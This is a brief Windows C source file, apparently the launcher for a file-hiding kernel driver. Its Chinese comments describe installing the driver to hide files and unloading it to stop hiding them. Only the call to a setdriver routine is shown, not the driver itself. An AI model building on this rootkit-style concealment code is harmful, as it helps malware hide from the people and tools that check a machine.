#include <windows.h>
#include "setdriver.h"
#include <stdio.h>
#include <stdlib.h>
//#include "Op_Function.h"

int main(){

	//CreateThread();
	//执行文件隐藏，安装驱动
	setdriver(Install_Run);
	//取消文件隐藏，卸载驱动
	//setdriver(Stop_Unload);
}